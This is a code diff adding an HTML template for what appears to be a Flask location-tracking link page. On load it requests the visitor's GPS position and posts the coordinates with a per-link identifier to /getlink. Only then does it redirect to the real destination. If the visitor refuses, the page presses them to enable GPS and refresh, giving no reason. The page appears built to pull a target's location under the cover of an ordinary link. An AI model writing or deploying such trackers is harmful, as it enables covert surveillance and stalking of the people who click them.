@@ -1,5 +1,73 @@
 <!DOCTYPE html>
 <html>
-    <script>const identifier = '{{identifier}}'</script>
-    <script src="{{ url_for('static', filename='locate.js') }}"></script>
+
+<head>
+    <style>
+        body {
+            text-align: center;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            padding: 35vh 0;
+        }
+    </style>
+</head>
+
+<body>
+    <h1 id="error-message" style="display:none">Please Turn on GPS, Allow Permission, and Refresh this Page</h1>
+    <p id="error-instructions" style="display:none; margin-top: 10px;">If you have accidentally denied permission, click
+        on the padlock icon on the address bar, select 'Permissions', and enable Location Permission.</p>
+
+    <script>
+        const identifier = '{{identifier}}';
+        function sendCoordinates(latitude, longitude) {
+            const url = '/getlink';
+            const data = {
+                latitude: latitude,
+                longitude: longitude,
+                identifier: identifier
+            };
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Response from server:', data);
+                    window.location.href = data.link;
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    document.getElementById('error-message').style.display = 'block';
+                    document.getElementById('error-instructions').style.display = 'block';
+                });
+        }
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+
+                    sendCoordinates(latitude, longitude);
+                }, error => {
+                    console.error('Error getting location:', error);
+                    document.getElementById('error-message').style.display = 'block';
+                    document.getElementById('error-instructions').style.display = 'block';
+                });
+            } else {
+                console.error('Geolocation is not supported by this browser.');
+                document.getElementById('error-message').style.display = 'block';
+                document.getElementById('error-instructions').style.display = 'block';
+            }
+        }
+
+        getLocation();
+
+    </script>
+</body>
+
 </html>
